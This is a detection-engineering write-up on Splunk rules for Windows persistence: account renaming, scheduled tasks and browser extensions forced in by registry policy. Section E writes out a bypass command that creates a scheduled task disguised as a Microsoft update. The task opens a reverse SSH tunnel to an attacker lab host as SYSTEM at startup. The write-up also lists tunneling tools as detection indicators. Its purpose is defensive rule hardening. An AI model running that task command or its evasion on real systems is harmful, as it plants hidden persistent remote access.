# PERSISTENCE (T0003)

---
# 8- ACCOUNT MANIPULATION (T1098)

In this attack type, the attacker modifies existing user accounts on the system or establishes persistence through newly created accounts.

# A. Writing the Splunk Query

Noise Suppression: Excluding service accounts with `$$` and standard users like SYSTEM is critical. This is where we silence the vast majority of false positives.

Group Filter: We use `where` to exclude insignificant groups such as Users or None, preventing alert fatigue.

- [Splunk SPL](../Rules/Splunk-SPL/Persistence/account-manipulation.spl) 👈

# B. Testing the Rule
Figure 1.1: Executing Atomic Red Team T1098.001 (Admin Account Manipulate)

    Description: Simulating an adversary behavior using Atomic Red Team framework to manipulate privileged accounts.

    Execution: The test triggers a defense evasion technique by automatically renaming the built-in local Administrator account to a randomized string (HaHa_594854421438). This mimics real-world attacks aimed at bypassing basic, keyword-based detection mechanisms.

![Splunk Search](../screenshots/splunk-account-1.png?v=2)

# C. Log Verification in Splunk
Figure 1.2: Splunk Search Results and Detection Verification

    Description: Verification of the detection rule inside Splunk after the attack simulation.

    Key Highlights: * Telemetry Capture: The rule successfully captures the account modification behavior under Windows Security EventCode 4738 (User account modified / renamed).

        Evasion Defeated: Despite the attacker randomizing the username to evade detection, the SPL query successfully tracks the asset using its persistent Security Identifier (TargetSid matching -500 or Administrator).

        Alert Generation: The engine properly calculates risk metrics, automatically categorizing the event as High severity and triggering the specific alert type: Account Manipulation / Rename (T1098).

![Splunk Search](../screenshots/splunk-account-2.png?v=2)


---
# 9- SCHEDULED TASK (T1053.005)

This rule detects scheduled tasks created with suspicious command patterns 
typically used by attackers to maintain persistence on a compromised host.

It monitors both EventID 4698 (Task Created) and EventID 4688 
(`schtasks.exe /create`) and applies a weighted scoring model based on 
indicators like PowerShell with encoded commands, hidden window flags, 
LOLBAS binaries (rundll32, mshta), and execution from temp or web paths.

This matters because scheduled tasks are one of the most common persistence 
techniques in real-world intrusions — attackers use them to survive reboots 
and execute payloads under SYSTEM privileges. Catching the technique itself 
provides coverage regardless of the specific malware family or framework used.

# A. Writing the Splunk Query

- [Splunk SPL](../Rules/Splunk-SPL/Persistence/scheduled-task-v1.spl) 👈

# B. Testing the Rule

We run PowerShell as administrator. We then simulate a fake scheduled task with the command below, targeting Splunk which monitors Windows logs.


![Testing Rule](../screenshots/splunk-task-1.png?v=2)

# C. Log Verification in Splunk

![Splunk Search](../screenshots/splunk-task-2.png?v=2)

# D. Coverage Gap — What This Rule Misses
The v1 scoring model was designed for one class of persistence: encoded / script-based payloads — PowerShell with -enc, IEX, base64 blobs, LOLBAS binaries (rundll32, mshta), and execution from temp/web paths. Against that class it performs well.

A different class of persistence does not trigger any of those indicators: native-binary tunneling. Tools like ssh -R, plink, chisel, socat, and netsh portproxy are legitimate binaries invoked with legitimate flags. There is no suspicious string for the v1 model to score — the maliciousness lives in the combination and context, not in any single token.

This rule has two concrete blind spots:

No tunneling category. A scheduled task whose action is ssh -R 4445:127.0.0.1:445 ... scores 0 under v1 and is dropped by where score >= 5.
Trusted-path allow-list is attacker-controllable. The exclusion where NOT match(lower(TaskName), "^\\microsoft\\...") was meant to suppress legitimate OS tasks. But the task name is fully attacker-chosen. By naming the task Microsoft\Windows\Update\WinBackup, an attacker is excluded before scoring even runs. The allow-list became an evasion primitive.

Lesson: A trusted path prefix is not a safe allow-list criterion, because the path is data the attacker controls. Identity-based suppression (exact task name + signed action binary) is required; a Microsoft\ prefix alone proves nothing.


# E. Bypass Demonstration
The following task combines persistence (T1053.005), masquerading (T1036), reverse SSH tunneling (T1572), and SYSTEM execution — and is built specifically to defeat both v1 blind spots:

```
schtasks /create /tn "Microsoft\Windows\Update\WinBackup" ^
  /tr "ssh -R 4445:127.0.0.1:445 kali@192.168.56.102 -N -o StrictHostKeyChecking=no" ^
  /sc onstart /ru SYSTEM
```

Captured at creation time (Sysmon EID 1 / EventID 4698):

```
Image:        C:\Windows\System32\schtasks.exe
CommandLine:  /create /tn Microsoft\Windows\Update\WinBackup
              /tr "ssh -R 4445:127.0.0.1:445 kali@192.168.56.102 -N -o StrictHostKeyChecking=no"
              /sc onstart /ru SYSTEM
User:         DESKTOP-MJ170VE\Tevfil Türkoğlu
ParentImage:  ...\WindowsPowerShell\v1.0\powershell.exe
```

Run against the v1 rule, this event is missed twice:

The command contains no PowerShell, no encoding, no LOLBAS, no temp/web path → score = 0.
Even if it had scored, the Microsoft\ task name matches the allow-list and the row is excluded before scoring.

# F. Hardening the Rule (v2)
1. Tunneling / lateral-movement category. New scoring for ssh -R/-L/-D, plink, chisel, socat, ngrok, frp, gost, and netsh portproxy. One subtlety worth noting: the SSH forward flags are matched against the case-preserved command string, because lower(cmd) collapses -L (port forward) into -l (login name) and would either miss the tunnel or false-positive on normal logins.

2. Masquerade as a signal, not an exclusion. A task whose name imitates a trusted Microsoft\ path but whose action launches a non-OS binary is now scored up instead of silently excluded. The benign allow-list still suppresses genuine OS/vendor tasks, but only when the row is not already suspicious (score < 4) : 

- [Splunk SPL](../Rules/Splunk-SPL/Persistence/scheduled-task-v2.spl) 👈

# G. Verification in Splunk 

![Splunk Search](../screenshots/splunk-task-3.png?v=2)

# BROWSER EXTENSIONS (1176)
This rule detects malicious or unauthorized Browser Extensions installed via Windows Registry modifications. Attackers frequently use browser extensions as a stealthy Persistence mechanism to steal credentials, hijack active sessions (cookie theft), monitor web traffic, or bypass Two-Factor Authentication (2FA).

It monitors Sysmon EventIDs 12 and 13 (Registry Object Add/ValueSet) targeting the extension and policy hives for all major browsers (Chrome, Edge, Firefox, Brave, Opera). The custom detection logic identifies the exact installation method, specifically flagging enterprise policy abuse like ExtensionInstallForcelist, which forces an extension to install silently and prevents the user from removing it.

This matters because modern attacks increasingly target the browser rather than the OS. By injecting a malicious extension via registry keys, the attacker ensures their code runs within the trusted context of the browser, easily bypassing traditional network inspection and file-based AV scanning.

# A. Writing the Splunk Query

- [Splunk SPL](../Rules/Splunk-SPL/Persistence/browser-extensions.spl) 👈

# B. Testing the Rule
To simulate this persistence technique, we use the command line to modify the HKLM registry hive. We inject a registry key that leverages Google Chrome's ExtensionInstallForcelist enterprise policy. This tells Chrome to silently download and install an extension directly from the Google Web Store update URL upon the next launch, securely locking the extension so the local user cannot disable it.

![Testing Rule](../screenshots/browser-extensions-1.png?v=2)

# C. Verification in Splunk 
The Splunk query successfully intercepts the registry modification. Due to our advanced parsing logic, the raw registry event is beautifully translated into actionable SOC metrics. We immediately see that the Browser is Chrome, the Install_Method is explicitly flagged as Force_Install_Policy, and consequently, the Severity is dynamically set to Critical. The query also neatly extracts the 32-character Extension_ID, which analysts can pivot on to hunt down the exact malicious extension in the environment.

![Splunk Search](../screenshots/browser-extensions-2.png?v=2)
